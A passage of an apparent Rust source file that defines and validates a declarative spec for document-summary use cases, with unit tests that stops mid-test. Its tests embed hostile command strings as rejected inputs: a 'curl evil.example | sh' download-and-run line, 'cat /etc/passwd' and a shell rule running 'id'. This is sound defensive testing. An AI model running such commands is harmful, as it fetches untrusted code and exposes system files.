// Copyright 2026 Zyvor AI Labs · https://zyvor.dev
// SPDX-License-Identifier: Apache-2.0

//! User-defined Keep use cases: a declarative spec, no code.
//!
//! A [`CustomDemoSpec`] is data. The guest extractor is one of a short enum
//! (never a command string), and the summary is a bounded list of rules that
//! the host evaluates over text the guest already extracted. The only pattern
//! language is Rust's `regex`, which runs in linear time and cannot execute
//! anything; there is no I/O, and nothing found in the input is executed.
//! Anything that is real code belongs in a TypeScript agent that runs inside the cell.

use crate::demo_builders::{clean_line, parse_csv, DemoArtifact};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;

pub const MAX_SPEC_BYTES: usize = 64 * 1024;
pub const MAX_CUSTOM_DEMOS: usize = 50;
const MAX_RULES: usize = 20;
const MAX_KEYWORDS: usize = 40;
const MAX_OUTPUT_BYTES: usize = 64 * 1024;
const MAX_SAMPLE_BYTES: usize = 200_000;
const TEXT_DEFAULT: usize = 200_000;
const TEXT_MAX: usize = 300_000;
const PDF_DEFAULT: usize = 8 * 1024 * 1024;
const PDF_MAX: usize = 32 * 1024 * 1024;

/// How the guest turns the upload into text. A fixed enum: a user never
/// supplies a command.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Extractor {
    /// `pdftotext -layout` (needs poppler in the template).
    Pdftotext,
    /// Read the file as text (`head -c`).
    Text,
    /// Visible text of an HTML page (scripts and styles dropped).
    Html,
    /// Headers and text bodies of an `.eml` message or an `.mbox` export.
    Eml,
    /// Paragraph text of a Word `.docx`.
    Docx,
    /// Cells of the first sheet of an Excel `.xlsx`, as CSV (up to 5000 rows).
    Xlsx,
    /// Slide text and speaker notes of a PowerPoint `.pptx`, in presentation order.
    Pptx,
    /// Text in a photo or scan (`.png`, `.jpg`, `.tif`), read by `tesseract` in the cell (needs tesseract in the template).
    Ocr,
}

/// The fixed Node scripts the guest runs for the non-PDF extractors. They are part
/// of this binary; a spec only picks one by name.
const HTML_SCRIPT: &str = concat!(
    include_str!("extractors/common.mjs"),
    include_str!("extractors/html.mjs")
);
const EML_SCRIPT: &str = concat!(
    include_str!("extractors/common.mjs"),
    include_str!("extractors/eml.mjs")
);
const DOCX_SCRIPT: &str = concat!(
    include_str!("extractors/common.mjs"),
    include_str!("extractors/docx.mjs")
);
const XLSX_SCRIPT: &str = concat!(
    include_str!("extractors/common.mjs"),
    include_str!("extractors/xlsx.mjs")
);
const PPTX_SCRIPT: &str = concat!(
    include_str!("extractors/common.mjs"),
    include_str!("extractors/pptx.mjs")
);

impl Extractor {
    /// Fixed file name inside the guest. Never derived from the upload.
    pub fn guest_file(self) -> &'static str {
        match self {
            Extractor::Pdftotext => "input.pdf",
            Extractor::Text => "input.txt",
            Extractor::Html => "input.html",
            Extractor::Eml => "input.eml",
            Extractor::Docx => "input.docx",
            Extractor::Xlsx => "input.xlsx",
            Extractor::Pptx => "input.pptx",
            // Tesseract sniffs the format from the bytes, so one fixed name serves every image type.
            Extractor::Ocr => "input.img",
        }
    }

    /// The script the guest runs, for the extractors that have one.
    pub fn script(self) -> Option<&'static str> {
        match self {
            Extractor::Html => Some(HTML_SCRIPT),
            Extractor::Eml => Some(EML_SCRIPT),
            Extractor::Docx => Some(DOCX_SCRIPT),
            Extractor::Xlsx => Some(XLSX_SCRIPT),
            Extractor::Pptx => Some(PPTX_SCRIPT),
            Extractor::Pdftotext | Extractor::Text | Extractor::Ocr => None,
        }
    }

    /// (default, largest) upload size in bytes.
    fn size_limits(self) -> (usize, usize) {
        match self {
            Extractor::Pdftotext => (PDF_DEFAULT, PDF_MAX),
            Extractor::Text => (TEXT_DEFAULT, TEXT_MAX),
            Extractor::Html | Extractor::Eml => (2 * 1024 * 1024, 8 * 1024 * 1024),
            Extractor::Docx | Extractor::Xlsx | Extractor::Pptx | Extractor::Ocr => {
                (4 * 1024 * 1024, 16 * 1024 * 1024)
            }
        }
    }

    /// Extensions this extractor can read. `None` means any text-like extension.
    fn readable(self) -> Option<&'static [&'static str]> {
        match self {
            Extractor::Pdftotext => Some(&["pdf"]),
            Extractor::Text => None,
            Extractor::Html => Some(&["html", "htm"]),
            Extractor::Eml => Some(&["eml", "mbox"]),
            Extractor::Docx => Some(&["docx"]),
            Extractor::Xlsx => Some(&["xlsx"]),
            Extractor::Pptx => Some(&["pptx"]),
            Extractor::Ocr => Some(&["png", "jpg", "jpeg", "tif", "tiff"]),
        }
    }

    /// A bundled sample is plain text, so only text-based extractors can carry one.
    fn allows_sample(self) -> bool {
        matches!(self, Extractor::Text | Extractor::Html | Extractor::Eml)
    }
}

/// One summary section. Everything is bounded and pure.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case", deny_unknown_fields)]
pub enum Rule {
    /// Lines that contain any of the keywords (case-insensitive).
    KeywordSections {
        title: String,
        keywords: Vec<String>,
        #[serde(default)]
        max_lines: Option<usize>,
    },
    /// The most repeated lines, with digits collapsed so near-duplicates group.
    TopRepeatedLines {
        title: String,
        #[serde(default)]
        top: Option<usize>,
    },
    /// Line, word and character counts.
    Stats {
        #[serde(default)]
        title: Option<String>,
    },
    /// For a CSV: distinct count and most common values per named column.
    CsvColumns {
        title: String,
        columns: Vec<String>,
        #[serde(default)]
        top: Option<usize>,
    },
    /// Values found by a regular expression (Rust `regex`: linear time, no backreferences),
    /// most frequent first. `group` picks a capture group instead of the whole match.
    RegexExtract {
        title: String,
        pattern: String,
        #[serde(default)]
        group: Option<usize>,
        #[serde(default)]
        max_matches: Option<usize>,
    },
    /// Values at simple paths in a JSON file: `a.b`, `items[0].id`, `items[*].name`.
    JsonPath { title: String, paths: Vec<String> },
    /// The first rows of a CSV, as a table.
    Table {
        title: String,
        #[serde(default)]
        max_rows: Option<usize>,
    },
}

/// An optional model-assisted step. After the cell has extracted the text, the **host** sends that
/// text to one declared endpoint and appends the reply to the artifact. The cell still has no
/// network at all, so the cell's connection count stays 0.
///
/// The pack names the endpoint; the operator's vault decides whether it may be used. `credential`
/// must exist in the vault, and its host, method, path and port limits apply unchanged. The first
/// use of an endpoint by a use case also needs an out-of-band approval, and every call is audited.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ModelSpec {
    /// Vault credential that holds the API key. It pins the host this call may reach.
    pub credential: String,
    /// OpenAI-compatible base URL, e.g. `https://api.example.com/v1`. The call goes to
    /// `<base_url>/chat/completions`. `https`, or `http` for a loopback address.
    pub base_url: String,
    /// Model id the provider expects.
    pub model: String,
    /// What to do with the text. The document text is sent as untrusted data, not as instructions.
    pub instruction: String,
    /// Characters of extracted text to send (1000..=100000, default 24000). The rest is dropped.
    #[serde(default)]
    pub max_input_chars: Option<usize>,
    /// Upper bound on the reply (50..=4000 tokens, default 800).
    #[serde(default)]
    pub max_output_tokens: Option<u32>,
}

impl ModelSpec {
    pub fn input_cap(&self) -> usize {
        self.max_input_chars.unwrap_or(24_000)
    }

    pub fn output_cap(&self) -> u32 {
        self.max_output_tokens.unwrap_or(800)
    }

    /// The parsed `base_url`, checked: no credentials, query or fragment in it, and
    /// TLS unless the host is a loopback address.
    pub fn base(&self) -> Result<url::Url, String> {
        let u = url::Url::parse(&self.base_url).map_err(|e| format!("base_url: {e}"))?;
        if !u.username().is_empty()
            || u.password().is_some()
            || u.query().is_some()
            || u.fragment().is_some()
        {
            return Err("base_url must not carry credentials, a query or a fragment".into());
        }
        let loopback = match u.host() {
            Some(url::Host::Domain(d)) => d.eq_ignore_ascii_case("localhost"),
            Some(url::Host::Ipv4(a)) => a.is_loopback(),
            Some(url::Host::Ipv6(a)) => a.is_loopback(),
            None => return Err("base_url needs a host".into()),
        };
        match u.scheme() {
            "https" => {}
            "http" if loopback => {}
            _ => return Err("base_url must be https (http only for localhost)".into()),
        }
        if u.path().len() > 100 {
            return Err("base_url path is too long".into());
        }
        Ok(u)
    }

    /// The URL the host will POST to.
    pub fn endpoint(&self) -> Result<url::Url, String> {
        let mut u = self.base()?;
        let path = format!("{}/chat/completions", u.path().trim_end_matches('/'));
        u.set_path(&path);
        Ok(u)
    }

    pub fn host(&self) -> String {
        self.base()
            .ok()
            .and_then(|u| u.host_str().map(str::to_ascii_lowercase))
            .unwrap_or_default()
    }

    fn validate(&self) -> Result<(), String> {
        let cred_ok = !self.credential.is_empty()
            && self.credential.len() <= 64
            && self
                .credential
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_' | b'.'));
        if !cred_ok {
            return Err("model.credential must be 1-64 letters, digits, '-', '_' or '.'".into());
        }
        self.base()?;
        if !plain(&self.model, 80) {
            return Err("model.model must be 1-80 plain characters".into());
        }
        let n = self.instruction.chars().count();
        if n == 0
            || n > 1000
            || self
                .instruction
                .chars()
                .any(|c| c.is_control() && c != '\n')
        {
            return Err("model.instruction must be 1-1000 characters".into());
        }
        if self
            .max_input_chars
            .is_some_and(|n| !(1000..=100_000).contains(&n))
        {
            return Err("model.max_input_chars must be 1000..=100000".into());
        }
        if self
            .max_output_tokens
            .is_some_and(|n| !(50..=4000).contains(&n))
        {
            return Err("model.max_output_tokens must be 50..=4000".into());
        }
        Ok(())
    }
}

/// Built-in sample text shipped with a spec (text extractors only).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct SampleSpec {
    pub filename: String,
    pub text: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct CustomDemoSpec {
    pub id: String,
    pub title: String,
    #[serde(default)]
    pub description: String,
    /// Lower-case file extensions, no dot.
    pub accepts: Vec<String>,
    #[serde(default)]
    pub max_bytes: Option<usize>,
    pub extract: Extractor,
    pub summary: Vec<Rule>,
    /// Name of the artifact, e.g. `report.md`. Defaults to `summary.md`.
    #[serde(default)]
    pub artifact_title: Option<String>,
    #[serde(default)]
    pub sample: Option<SampleSpec>,
    /// Optional model-assisted step (see [`ModelSpec`]). Off unless declared.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub model: Option<ModelSpec>,
}

/// A stored custom spec.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CustomDemoRecord {
    pub spec: CustomDemoSpec,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
}

fn is_slug(s: &str, max: usize) -> bool {
    !s.is_empty()
        && s.len() <= max
        && !s.starts_with('-')
        && !s.ends_with('-')
        && s.bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
}

fn plain(s: &str, max: usize) -> bool {
    let t = s.trim();
    !t.is_empty() && t.chars().count() <= max && !t.chars().any(char::is_control)
}

impl CustomDemoSpec {
    /// Effective upload limit in bytes.
    pub fn max_bytes(&self) -> usize {
        self.max_bytes.unwrap_or(self.extract.size_limits().0)
    }

    pub fn artifact_title(&self) -> &str {
        self.artifact_title.as_deref().unwrap_or("summary.md")
    }

    /// Fixed file name inside the guest. Never derived from the upload.
    pub fn guest_file(&self) -> &'static str {
        self.extract.guest_file()
    }

    /// Reject anything a user could use to widen what the host does.
    /// `builtin_ids` are ids the spec may not take.
    pub fn validate(&self, builtin_ids: &[&str]) -> Result<(), String> {
        if !is_slug(&self.id, 40) {
            return Err("id must be 1-40 lowercase letters, digits or '-'".into());
        }
        if builtin_ids.contains(&self.id.as_str()) {
            return Err(format!("{:?} is a built-in use case id", self.id));
        }
        if !plain(&self.title, 80) {
            return Err("title must be 1-80 plain characters".into());
        }
        if self.description.chars().count() > 240 || self.description.chars().any(char::is_control)
        {
            return Err("description must be at most 240 plain characters".into());
        }
        if self.accepts.is_empty() || self.accepts.len() > 6 {
            return Err("accepts must list 1-6 file extensions".into());
        }
        for e in &self.accepts {
            if e.is_empty()
                || e.len() > 8
                || !e
                    .bytes()
                    .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit())
            {
                return Err(format!(
                    "bad extension {e:?}: lowercase letters and digits only"
                ));
            }
        }
        match self.extract.readable() {
            Some(ok) => {
                if let Some(bad) = self.accepts.iter().find(|e| !ok.contains(&e.as_str())) {
                    return Err(format!(
                        "the {} extractor reads only .{}, not .{bad}",
                        serde_json::to_value(self.extract)
                            .ok()
                            .and_then(|v| v.as_str().map(str::to_string))
                            .unwrap_or_default(),
                        ok.join(" / .")
                    ));
                }
            }
            None => {
                const BINARY: [&str; 10] = [
                    "pdf", "docx", "xlsx", "pptx", "zip", "png", "jpg", "jpeg", "tif", "tiff",
                ];
                if let Some(bad) = self.accepts.iter().find(|e| BINARY.contains(&e.as_str())) {
                    return Err(format!(
                        "the text extractor cannot read .{bad}; use the extractor made for it"
                    ));
                }
            }
        }
        let (default, max) = self.extract.size_limits();
        let limit = self.max_bytes.unwrap_or(default);
        if limit == 0 || limit > max {
            return Err(format!("max_bytes must be 1..={max} for this extractor"));
        }
        if let Some(t) = &self.artifact_title {
            let ok = !t.is_empty()
                && t.len() <= 60
                && t.ends_with(".md")
                && t.bytes()
                    .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-'));
            if !ok {
                return Err(
                    "artifact_title must look like report.md (letters, digits, . _ -)".into(),
                );
            }
        }
        if self.summary.is_empty() || self.summary.len() > MAX_RULES {
            return Err(format!("summary needs 1-{MAX_RULES} rules"));
        }
        for rule in &self.summary {
            match rule {
                Rule::KeywordSections {
                    title,
                    keywords,
                    max_lines,
                } => {
                    if !plain(title, 80) {
                        return Err("rule title must be 1-80 plain characters".into());
                    }
                    if keywords.is_empty() || keywords.len() > MAX_KEYWORDS {
                        return Err(format!("keyword_sections needs 1-{MAX_KEYWORDS} keywords"));
                    }
                    if keywords.iter().any(|k| !plain(k, 60)) {
                        return Err("keywords must be 1-60 plain characters".into());
                    }
                    if max_lines.is_some_and(|n| n == 0 || n > 20) {
                        return Err("max_lines must be 1..=20".into());
                    }
                }
                Rule::TopRepeatedLines { title, top } => {
                    if !plain(title, 80) {
                        return Err("rule title must be 1-80 plain characters".into());
                    }
                    if top.is_some_and(|n| n == 0 || n > 20) {
                        return Err("top must be 1..=20".into());
                    }
                }
                Rule::Stats { title } => {
                    if title.as_deref().is_some_and(|t| !plain(t, 80)) {
                        return Err("rule title must be 1-80 plain characters".into());
                    }
                }
                Rule::CsvColumns {
                    title,
                    columns,
                    top,
                } => {
                    if !plain(title, 80) {
                        return Err("rule title must be 1-80 plain characters".into());
                    }
                    if columns.is_empty()
                        || columns.len() > 10
                        || columns.iter().any(|c| !plain(c, 60))
                    {
                        return Err("csv_columns needs 1-10 plain column names".into());
                    }
                    if top.is_some_and(|n| n == 0 || n > 10) {
                        return Err("top must be 1..=10".into());
                    }
                }
                Rule::RegexExtract {
                    title,
                    pattern,
                    group,
                    max_matches,
                } => {
                    if !plain(title, 80) {
                        return Err("rule title must be 1-80 plain characters".into());
                    }
                    let re = compile_pattern(pattern)?;
                    if group.is_some_and(|g| g >= re.captures_len()) {
                        return Err(format!(
                            "group {} does not exist in the pattern",
                            group.unwrap_or_default()
                        ));
                    }
                    if max_matches.is_some_and(|n| n == 0 || n > 50) {
                        return Err("max_matches must be 1..=50".into());
                    }
                }
                Rule::JsonPath { title, paths } => {
                    if !plain(title, 80) {
                        return Err("rule title must be 1-80 plain characters".into());
                    }
                    if paths.is_empty() || paths.len() > 10 {
                        return Err("json_path needs 1-10 paths".into());
                    }
                    for p in paths {
                        parse_json_path(p)?;
                    }
                }
                Rule::Table { title, max_rows } => {
                    if !plain(title, 80) {
                        return Err("rule title must be 1-80 plain characters".into());
                    }
                    if max_rows.is_some_and(|n| n == 0 || n > 50) {
                        return Err("max_rows must be 1..=50".into());
                    }
                }
            }
        }
        if let Some(m) = &self.model {
            m.validate()?;
        }
        if let Some(s) = &self.sample {
            if !self.extract.allows_sample() {
                return Err(
                    "a sample is supported for text, html and eml extractors only; upload a file to run it"
                        .into(),
                );
            }
            let ext = s
                .filename
                .rsplit_once('.')
                .map(|(_, e)| e.to_ascii_lowercase());
            if !ext.is_some_and(|e| self.accepts.contains(&e)) {
                return Err("sample.filename must end in one of the accepted extensions".into());
            }
            if !plain(&s.filename, 80) || s.filename.contains(['/', '\\']) {
                return Err("sample.filename must be a plain file name".into());
            }
            if s.text.is_empty() || s.text.len() > MAX_SAMPLE_BYTES {
                return Err(format!("sample.text must be 1..={MAX_SAMPLE_BYTES} bytes"));
            }
        }
        Ok(())
    }

    /// Evaluate the rules over extracted text.
    pub fn render(&self, filename: &str, extract: &str) -> Result<Vec<DemoArtifact>, String> {
        let mut body = format!(
            "# {}\n\nSummary of `{}` by the **{}** use case. Extractive: no model was called and \
             nothing in the file was run.\n\n",
            self.artifact_title(),
            clean_line(filename),
            clean_line(&self.title)
        );
        for rule in &self.summary {
            body.push_str(&eval_rule(rule, extract)?);
            body.push('\n');
            if body.len() > MAX_OUTPUT_BYTES {
                body.truncate(MAX_OUTPUT_BYTES);
                body.push_str("\n\n*(output truncated)*\n");
                break;
            }
        }
        Ok(vec![DemoArtifact {
            kind: "summary".into(),
            title: self.artifact_title().into(),
            content_type: "text/markdown",
            body,
        }])
    }
}

fn eval_rule(rule: &Rule, text: &str) -> Result<String, String> {
    Ok(match rule {
        Rule::KeywordSections {
            title,
            keywords,
            max_lines,
        } => {
            let needles: Vec<String> = keywords.iter().map(|k| k.trim().to_lowercase()).collect();
            let max = max_lines.unwrap_or(5).min(20);
            let hits: Vec<String> = text
                .lines()
                .map(str::trim)
                .filter(|l| l.len() > 3)
                .filter(|l| {
                    let lower = l.to_lowercase();
                    needles.iter().any(|n| lower.contains(n.as_str()))
                })
                .take(max)
                .map(clean_line)
                .collect();
            let list = if hits.is_empty() {
                "- (no matches)".to_string()
            } else {
                hits.iter()
                    .map(|h| format!("- {h}"))
                    .collect::<Vec<_>>()
                    .join("\n")
            };
            format!("## {}\n{list}\n", clean_line(title))
        }
        Rule::TopRepeatedLines { title, top } => {
            let mut counts: BTreeMap<String, u64> = BTreeMap::new();
            for line in text.lines().map(str::trim).filter(|l| l.len() > 3) {
                *counts
                    .entry(crate::demo_builders::normalise_message(line))
                    .or_default() += 1;
            }
            let mut rows: Vec<(&String, &u64)> = counts.iter().filter(|(_, n)| **n > 1).collect();
            rows.sort_by(|a, b| b.1.cmp(a.1).then(a.0.cmp(b.0)));
            let list = if rows.is_empty() {
                "- (no repeated lines)".to_string()
            } else {
                rows.iter()
                    .take(top.unwrap_or(5).min(20))
                    .map(|(l, n)| format!("- {n}× {l}"))
                    .collect::<Vec<_>>()
                    .join("\n")
            };
            format!("## {}\n{list}\n", clean_line(title))
        }
        Rule::Stats { title } => {
            let lines = text.lines().count();
            let non_empty = text.lines().filter(|l| !l.trim().is_empty()).count();
            format!(
                "## {}\n| Measure | Value |\n|---|---|\n| Lines | {lines} |\n| Non-empty lines | {non_empty} |\n\
                 | Words | {} |\n| Characters | {} |\n",
                clean_line(title.as_deref().unwrap_or("Stats")),
                text.split_whitespace().count(),
                text.chars().count()
            )
        }
        Rule::CsvColumns {
            title,
            columns,
            top,
        } => {
            let rows = parse_csv(text);
            if rows.is_empty() {
                return Err("the file has no CSV rows".into());
            }
            let header: Vec<String> = rows[0].iter().map(|h| h.trim().to_lowercase()).collect();
            let mut out = format!("## {}\n", clean_line(title));
            for col in columns {
                let Some(idx) = header.iter().position(|h| *h == col.trim().to_lowercase()) else {
                    out.push_str(&format!("- `{}`: column not found\n", clean_line(col)));
                    continue;
                };
                let mut counts: BTreeMap<String, u64> = BTreeMap::new();
                for row in rows.iter().skip(1) {
                    let v = row.get(idx).map(|c| c.trim()).unwrap_or("");
                    if !v.is_empty() {
                        *counts.entry(clean_line(v)).or_default() += 1;
                    }
                }
                let mut sorted: Vec<(&String, &u64)> = counts.iter().collect();
                sorted.sort_by(|a, b| b.1.cmp(a.1).then(a.0.cmp(b.0)));
                let tops = sorted
                    .iter()
                    .take(top.unwrap_or(5).min(10))
                    .map(|(v, n)| format!("{v} ({n})"))
                    .collect::<Vec<_>>()
                    .join(", ");
                out.push_str(&format!(
                    "- `{}`: {} distinct. Most common: {}\n",
                    clean_line(col),
                    counts.len(),
                    if tops.is_empty() {
                        "(all empty)".into()
                    } else {
                        tops
                    }
                ));
            }
            out
        }
        Rule::RegexExtract {
            title,
            pattern,
            group,
            max_matches,
        } => {
            let re = compile_pattern(pattern)?;
            let mut counts: BTreeMap<String, u64> = BTreeMap::new();
            for caps in re.captures_iter(text) {
                let m = caps.get(group.unwrap_or(0));
                if let Some(m) = m {
                    let v = clean_line(m.as_str());
                    if !v.is_empty() {
                        *counts.entry(v).or_default() += 1;
                    }
                }
            }
            let mut rows: Vec<(&String, &u64)> = counts.iter().collect();
            rows.sort_by(|a, b| b.1.cmp(a.1).then(a.0.cmp(b.0)));
            let list = if rows.is_empty() {
                "- (no matches)".to_string()
            } else {
                rows.iter()
                    .take(max_matches.unwrap_or(10).min(50))
                    .map(|(v, n)| format!("- {n}× {v}"))
                    .collect::<Vec<_>>()
                    .join("\n")
            };
            format!("## {}\n{list}\n", clean_line(title))
        }
        Rule::JsonPath { title, paths } => {
            let doc: serde_json::Value = serde_json::from_str(text.trim()).map_err(|e| {
                format!(
                    "the file is not valid JSON ({e}); a very large file may have been cut short"
                )
            })?;
            let mut out = format!("## {}\n", clean_line(title));
            for p in paths {
                let found = json_path_values(&doc, &parse_json_path(p)?);
                let shown: Vec<String> = found.iter().take(10).map(|v| json_scalar(v)).collect();
                let more = found.len().saturating_sub(10);
                out.push_str(&format!(
                    "- `{}`: {}{}\n",
                    clean_line(p),
                    if shown.is_empty() {
                        "(not found)".to_string()
                    } else {
                        shown.join("; ")
                    },
                    if more > 0 {
                        format!(" (+{more} more)")
                    } else {
                        String::new()
                    }
                ));
            }
            out
        }
        Rule::Table { title, max_rows } => {
            let rows = parse_csv(text);
            if rows.is_empty() {
                return Err("the file has no CSV rows".into());
            }
            let width = rows[0].len().clamp(1, 12);
            let cell =
                |row: &Vec<String>, i: usize| clean_line(row.get(i).map_or("", |c| c.trim()));
            let mut out = format!("## {}\n", clean_line(title));
            out.push_str(&format!(
                "| {} |\n|{}\n",
                (0..width)
                    .map(|i| cell(&rows[0], i))
                    .collect::<Vec<_>>()
                    .join(" | "),
                "---|".repeat(width)
            ));
            for row in rows.iter().skip(1).take(max_rows.unwrap_or(10).min(50)) {
                out.push_str(&format!(
                    "| {} |\n",
                    (0..width)
                        .map(|i| cell(row, i))
                        .collect::<Vec<_>>()
                        .join(" | ")
                ));
            }
            let total = rows.len() - 1;
            let shown = total.min(max_rows.unwrap_or(10).min(50));
            if total > shown {
                out.push_str(&format!("\n*{shown} of {total} rows shown.*\n"));
            }
            out
        }
    })
}

/// A pattern the host will run: bounded in size, linear-time by construction.
fn compile_pattern(pattern: &str) -> Result<regex::Regex, String> {
    if pattern.is_empty() || pattern.len() > 200 || pattern.chars().any(char::is_control) {
        return Err("pattern must be 1-200 plain characters".into());
    }
    regex::RegexBuilder::new(pattern)
        .size_limit(1 << 20)
        .dfa_size_limit(1 << 20)
        .build()
        .map_err(|e| format!("bad pattern: {e}"))
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum PathSeg {
    Key(String),
    Index(usize),
    All,
}

/// `a.b[0].c`, `items[*].name`, with an optional leading `$`.
fn parse_json_path(path: &str) -> Result<Vec<PathSeg>, String> {
    let p = path.trim().trim_start_matches('$').trim_start_matches('.');
    if p.is_empty() || p.len() > 100 || p.chars().any(char::is_control) {
        return Err(format!("bad json path {path:?}"));
    }
    let mut segs = Vec::new();
    for part in p.split('.') {
        let (key, mut rest) = match part.find('[') {
            Some(i) => (&part[..i], &part[i..]),
            None => (part, ""),
        };
        if key.is_empty() && rest.is_empty() {
            return Err(format!("bad json path {path:?}"));
        }
        if !key.is_empty() {
            segs.push(PathSeg::Key(key.to_string()));
        }
        while !rest.is_empty() {
            let end = rest
                .find(']')
                .ok_or_else(|| format!("bad json path {path:?}: missing ]"))?;
            let inner = &rest[1..end];
            segs.push(if inner == "*" {
                PathSeg::All
            } else {
                PathSeg::Index(
                    inner
                        .parse()
                        .map_err(|_| format!("bad json path {path:?}: index {inner:?}"))?,
                )
            });
            rest = &rest[end + 1..];
            if !rest.is_empty() && !rest.starts_with('[') {
                return Err(format!("bad json path {path:?}"));
            }
        }
    }
    Ok(segs)
}

fn json_path_values<'a>(
    doc: &'a serde_json::Value,
    segs: &[PathSeg],
) -> Vec<&'a serde_json::Value> {
    let mut cur = vec![doc];
    for seg in segs {
        let mut next = Vec::new();
        for v in cur {
            match (seg, v) {
                (PathSeg::Key(k), serde_json::Value::Object(m)) => next.extend(m.get(k)),
                (PathSeg::Index(i), serde_json::Value::Array(a)) => next.extend(a.get(*i)),
                (PathSeg::All, serde_json::Value::Array(a)) => next.extend(a.iter()),
                _ => {}
            }
        }
        cur = next;
        if cur.len() > 1000 {
            cur.truncate(1000);
        }
    }
    cur
}

fn json_scalar(v: &serde_json::Value) -> String {
    match v {
        serde_json::Value::String(s) => clean_line(s),
        other => clean_line(&other.to_string()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Every declarative pack shipped in `examples/merion-agents` must pass the same validation the deploy path applies,
    /// so a limit (a 200-character pattern, an 80-character title) is caught here and not by a red CI job on main.
    #[test]
    fn every_shipped_usecase_pack_validates() {
        let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../examples/merion-agents");
        // the contributor template must stay a valid pack too, or the guide would hand people a broken file
        let template =
            std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../docs/merion/pack-template");
        let pack_only = [
            "kind",
            "name",
            "manifest",
            "goal",
            "entry",
            "sample_file",
            "$schema",
        ];
        let mut checked = 0;
        let mut entries: Vec<_> = std::fs::read_dir(&dir)
            .expect("examples/merion-agents")
            .flatten()
            .collect();
        entries.sort_by_key(|e| e.file_name());
        let mut roots: Vec<std::path::PathBuf> = entries.into_iter().map(|e| e.path()).collect();
        roots.push(template);
        for root in roots {
            let Ok(raw) = std::fs::read_to_string(root.join("pack.json")) else {
                continue;
            };
            let pack: serde_json::Value = serde_json::from_str(&raw)
                .unwrap_or_else(|e| panic!("{}: pack.json is not JSON: {e}", root.display()));
            if pack["kind"] != "usecase" {
                continue;
            }
            let name = pack["name"].as_str().unwrap_or_default().to_string();
            let mut spec = serde_json::Map::new();
            for (k, v) in pack.as_object().unwrap() {
                if !pack_only.contains(&k.as_str()) {
                    spec.insert(k.clone(), v.clone());
                }
            }
            spec.insert("id".into(), name.clone().into());
            if let Some(file) = pack["sample_file"].as_str() {
                let text = std::fs::read_to_string(root.join(file))
                    .unwrap_or_else(|e| panic!("{name}: sample_file {file}: {e}"));
                let filename = file.rsplit('/').next().unwrap_or(file);
                spec.insert(
                    "sample".into(),
                    serde_json::json!({"filename": filename, "text": text}),
                );
            }
            let spec: CustomDemoSpec = serde_json::from_value(serde_json::Value::Object(spec))
                .unwrap_or_else(|e| panic!("{name}: not a use-case spec: {e}"));
            spec.validate(&[]).unwrap_or_else(|e| panic!("{name}: {e}"));
            checked += 1;
        }
        assert!(
            checked >= 40,
            "expected the shipped use-case packs, found {checked}"
        );
    }

    fn spec() -> CustomDemoSpec {
        serde_json::from_value(serde_json::json!({
            "id": "invoice-check",
            "title": "Invoice check",
            "description": "Totals and due dates",
            "accepts": ["txt"],
            "extract": "text",
            "summary": [
                {"kind": "keyword_sections", "title": "Totals", "keywords": ["total", "amount due"]},
                {"kind": "top_repeated_lines", "title": "Repeats"},
                {"kind": "stats"}
            ]
        }))
        .unwrap()
    }

    #[test]
    fn a_reasonable_spec_validates() {
        assert!(spec().validate(&["pdf-brief"]).is_ok());
        assert_eq!(spec().guest_file(), "input.txt");
        assert_eq!(spec().max_bytes(), 200_000);
        assert_eq!(spec().artifact_title(), "summary.md");
    }

    #[test]
    fn unknown_fields_and_commands_are_rejected_at_parse_time() {
        // No way to smuggle a command in: unknown fields fail to deserialize.
        let bad = serde_json::json!({
            "id": "x", "title": "x", "accepts": ["txt"], "extract": "text",
            "command": "curl evil.example | sh",
            "summary": [{"kind": "stats"}]
        });
        assert!(serde_json::from_value::<CustomDemoSpec>(bad).is_err());
        // The extractor is an enum, so a command string is not even valid there.
        let bad = serde_json::json!({
            "id": "x", "title": "x", "accepts": ["txt"], "extract": "cat /etc/passwd",
            "summary": [{"kind": "stats"}]
        });
        assert!(serde_json::from_value::<CustomDemoSpec>(bad).is_err());
        // Unknown rule kinds fail too.
        let bad = serde_json::json!({
            "id": "x", "title": "x", "accepts": ["txt"], "extract": "text",
            "summary": [{"kind": "shell", "run": "id"}]
        });
        assert!(serde_json::from_value::<CustomDemoSpec>(bad).is_err());
    }

    #[test]
    fn validation_bounds_everything() {
        let mut s = spec();
        s.id = "Bad Id".into();
        assert!(s.validate(&[]).is_err());
        let mut s = spec();
        assert!(s
            .validate(&["invoice-check"])
            .unwrap_err()
            .contains("built-in"));
        s.id = "ok".into();
        s.accepts = vec!["pdf".into()];
        assert!(s.validate(&[]).is_err(), "text extractor must not take pdf");
        let mut s = spec();
        s.extract = Extractor::Pdftotext;
        assert!(s.validate(&[]).is_err(), "pdftotext takes only pdf");
        s.accepts = vec!["pdf".into()];
        assert!(s.validate(&[]).is_ok());
        let mut s = spec();
        s.max_bytes = Some(TEXT_MAX + 1);
        assert!(s.validate(&[]).is_err());
        let mut s = spec();
        s.summary = vec![Rule::Stats { title: None }; MAX_RULES + 1];
        assert!(s.validate(&[]).is_err());
        let mut s = spec();
        s.summary = vec![Rule::KeywordSections {
            title: "t".into(),
            keywords: vec![],
            max_lines: None,
        }];
        assert!(s.validate(&[]).is_err());
        let mut s = spec();
